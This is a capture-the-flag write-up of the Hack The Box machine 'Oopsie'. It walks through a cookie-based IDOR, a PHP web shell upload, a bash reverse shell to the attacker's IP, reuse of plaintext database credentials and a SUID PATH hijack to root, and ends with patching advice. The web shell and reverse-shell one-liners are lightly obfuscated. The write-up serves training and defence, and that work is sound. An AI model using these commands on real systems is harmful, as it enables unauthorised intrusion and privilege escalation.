---
title: "HTB: Oopsie - IDOR & Path Hijacking"
description: "Pwned Oopsie on Hack The Box. From a sneaky IDOR cookie manipulation to a classic SUID path hijack."
date: 2026-07-23T19:54:34+01:00
tags: ["htb", "linux", "idor", "suid", "red-team", "privilege-escalation"]
authors: ["0xakr4m"]
image: ../images/headers/vagabond-01.png
draft: false
---

> *"Perceive that which cannot be seen with the eye."* — Miyamoto Musashi, *Vagabond*

## 1. Quick Info Card
	
- **Machine Name:** Oopsie
- **OS / Type:** Linux
- **Difficulty:** Very Easy
- **Key Vulnerability:** IDOR (Cookie Manipulation) → Hardcoded Credentials → SUID Path Hijacking

## 2. The Game Plan & The Rabbit Holes (Red Teamer Mindset)

Alright, VPN up, Nmap running. We're hyped. Let's see what we're dealing with.

**Nmap Output:**
```text
22/tcp open  ssh
80/tcp open  http
```

**The Immediate Thoughts:**
- **Port 22 → SSH.** Cool, but we don't have creds. No point wasting Hydra cycles yet.
- **Port 80 → Web server.** Let's poke it.

**Rabbit Hole #1 – The Gobuster Trap:**
We fire up gobuster against the web root because that's what we always do. We're sitting there watching 10,000 requests fly by, sipping coffee, waiting for something juicy. We get `/images/`, `/css/`, `/js/` – absolutely nothing useful. We're like:
> "Bruh, is this box just a static HTML page? Did I break my VPN? Is the box even on?"

**The Aha Moment:**
We hit `Ctrl+U` (View Page Source) like a civilized human being. And there it is:
```html
<script src="/cdn-cgi/login/script.js"></script>
```
We just spent 10 minutes brute-forcing directories when the answer was literally hardcoded in the source code. Classic. We navigate to `/cdn-cgi/login/index.php` and boom – login page.

**Rabbit Hole #2 – The Credential Guessing Game:**
We try `admin:admin`, `guest:guest`, `root:root`. Nothing. We stare at the login form, feeling heavily defeated by a "Very Easy" box.

**The Aha Moment #2:**
We notice a tiny link: "Login as Guest". We click it. We're in. Wait… that's it? No password? Just a free ticket to the admin panel? Okay then.

**Rabbit Hole #3 – The "Super Admin" Wall:**
We click "Uploads". Error: "This action require super admin rights." We're guests, not admins. We look at the URL: `?content=accounts&id=2`. We change `id=2` to `id=1`. We see the admin account. We try `id=3`, `id=4`. Nothing. We're stuck again.

**The Aha Moment #3 – Cookie Inspection:**
We open DevTools (F12), go to the Application/Storage tab, and look at cookies. We see:
```text
user=2233
role=guest
```
We remember the admin's Access ID was 34322. We change `user=2233` to `user=34322`, refresh the page, and suddenly we're Super Admin. The uploads page now shows a file upload form. It was literally that simple. The server trusted the client entirely.

**Facepalm Moment:**
> "So you're telling me I could have just edited the cookie from the start? All that time wasted on gobuster and IDOR testing? I feel personally attacked."

**The Rest of the Box:**
We upload a PHP shell, find it at `/uploads/`, get a reverse shell as `www-data`, find `db.php` with credentials, `su` to `robert`, grab the user flag, find a SUID binary `/usr/bin/bugtracker`, exploit it with a PATH hijack, and get root. Simple chain of bad decisions by the admin. Let's get into the weeds.

---

## 3. The Execution (Step-by-Step Walkthrough)

### Recon

**Nmap Scan:**
```bash
nmap -T4 -Pn 10.129.116.224
```

**Results:**
```text
22/tcp open  ssh
80/tcp open  http
```

We identify a Linux box with SSH and a web server.

### Web Enumeration

We browse to `http://10.129.116.224` and view the source code.

**HTML Source Snippet:**
```html
<script src="/cdn-cgi/login/script.js"></script>
```

We navigate to `/cdn-cgi/login/index.php` and find a login page.

### Initial Access – Guest Login

We notice a link: "Login as Guest". Clicking it takes us to `/cdn-cgi/login/admin.php?content=accounts&id=2`.

### Cookie Manipulation (IDOR)

We view the admin accounts. Changing `id=1` shows the admin user:
```text
Access ID: 34322 | Name: admin | Email: admin@megacorp.com
```

We check the cookies:
```text
user=2233
role=guest
```

We modify the `user` cookie to `34322` (the admin's Access ID). We can do this via DevTools (Application → Storage → Cookies) or via curl.
```bash
curl -b "user=34322; role=guest" http://10.129.116.224/cdn-cgi/login/admin.php?content=uploads
```

We now have Super Admin access and see the file upload form. Time to cause some chaos.

### Gaining a Foothold – Uploading a Web Shell

We create a simple PHP shell:
```php
<?php system($_GET["c"."md"]); ?>
```

Save as `test.php` and upload it. We find it at `/uploads/test.php` (after some directory brute-forcing, but we could also just guess `/uploads/` as a common location).

We confirm execution:
```bash
curl -b "user=34322; role=guest" "http://10.129.116.224/uploads/test.php?cmd=id"
```

**Output:**
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell

We start a listener on our Kali machine:
```bash
nc -lvnp 4444
```

We trigger a reverse shell via the web shell:
```bash
curl -b "user=34322; role=guest" "http://10.129.116.224/uploads/test.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/de\"v\"/tcp/10.10.17.106/4444%200%3E%261%27"
```

We catch the shell and upgrade it to a fully interactive TTY so we don't accidentally Ctrl+C our way out of the box:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter twice
```

### Lateral Movement – Finding Credentials

As `www-data`, we enumerate the web directory:
```bash
cd /var/www/html/cdn-cgi/login
cat db.php
```

**Contents:**
```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

We switch to user `robert`:
```bash
su - robert
Password: M3g4C0rpUs3r!
```

### User Flag

We grab the user flag from robert's home directory:
```bash
cat /home/robert/user.txt
```

**User Flag:** `f2c74ee8db7983851ab2a96a44eb7981`

### Privilege Escalation – SUID Path Hijacking

We search for SUID binaries:
```bash
find / -perm -4000 -type f 2>/dev/null
```

We find `/usr/bin/bugtracker` (owned by root, group bugtracker). We check if robert is in the bugtracker group:
```bash
groups robert
```

**Output:**
```text
robert : robert bugtracker
```

We run the binary to see what it does:
```bash
/usr/bin/bugtracker
```

It prompts for a "Bug ID" and tries to cat `/root/reports/<input>`. It uses `cat` without an absolute path (i.e., it relies on `$PATH`).

We create a fake `cat` binary in `/tmp` that spawns a shell:
```bash
cd /tmp
echo '/bin/sh' > cat
chmod +x cat
export PATH=/tmp:$PATH
/usr/bin/bugtracker
```

When prompted for a Bug ID, we enter any string (e.g., `test`). Our fake `cat` is executed as root, spawning a root shell.

### Root Flag

Once root, we read the flag:
```bash
/bin/cat /root/root.txt
```

**Root Flag:** `af13b0bee69f8a877c3faf667f7beacf`

---

## 4. How to Patch This (The Blue Team Defense)

So you're a sysadmin and you just watched a hacker walk into your Linux server by changing a cookie and creating a fake cat file. *Bruh.* Here's how to stop this from happening.

1. **Don't Trust the Client**
   - *Root Cause:* The server used `user=2233` from a client-side cookie to identify the user.
   - *Fix:* Use secure, HTTP-Only session cookies (e.g., `PHPSESSID`) tied to a server-side session. The user's Access ID should be stored in the `$_SESSION` array, not in a user-editable cookie. Never rely on client-supplied data for authentication or authorization.

2. **No Hardcoded Credentials**
   - *Root Cause:* Database credentials were stored in plaintext in `db.php` inside the web root.
   - *Fix:* Store configuration files outside the public web root (`/var/www/html`). Use environment variables (e.g., `.env` with strict permissions) or a secure config directory (e.g., `/etc/app/config.ini` with `chmod 600`).

3. **Secure File Uploads**
   - *Root Cause:* The application allowed arbitrary PHP files to be uploaded and served directly.
   - *Fix:* Restrict file extensions to safe types (e.g., `.jpg`, `.png`). Store uploaded files outside the web root and serve them through a handler script. Disable PHP execution in the uploads directory using an `.htaccess` file: `php_flag engine off`.

4. **Absolute Paths in SUID Binaries**
   - *Root Cause:* `/usr/bin/bugtracker` called `cat` without an absolute path (`/bin/cat`), allowing PATH hijacking.
   - *Fix:* Always use absolute paths when executing external commands from SUID binaries. Change `cat` to `/bin/cat` in the source code. Also, sanitize user input to prevent command injection or path traversal.

5. **Limit Sudo and SUID**
   - *Root Cause:* The bugtracker binary was SUID root and had a vulnerable design.
   - *Fix:* Auditing SUID binaries is critical. Minimize SUID files. If a binary must run with elevated privileges, ensure it does not rely on user-controlled environment variables (like `$PATH`) or user input without sanitization. Consider using capabilities (e.g., `CAP_DAC_READ_SEARCH`) instead of full SUID root.

---

## Final Thoughts

Oopsie is a perfect example of how chaining small, seemingly harmless misconfigurations leads to a full compromise. Anonymous guest access → cookie manipulation → file upload → hardcoded credentials → path hijacking. Each step is trivial on its own, but together they form a devastating attack chain.

As Musashi said:
> *"Perceive that which cannot be seen with the eye."*

The admin thought they were safe because the login page looked secure. They didn't see the hidden directory in the source code, the guest backdoor, the hardcoded passwords, or the missing absolute paths in the SUID binary. But we did. Because we looked beyond the surface.

GG. See you on the next box.

*Write-up by 0xAkram | HTB Player #76025*
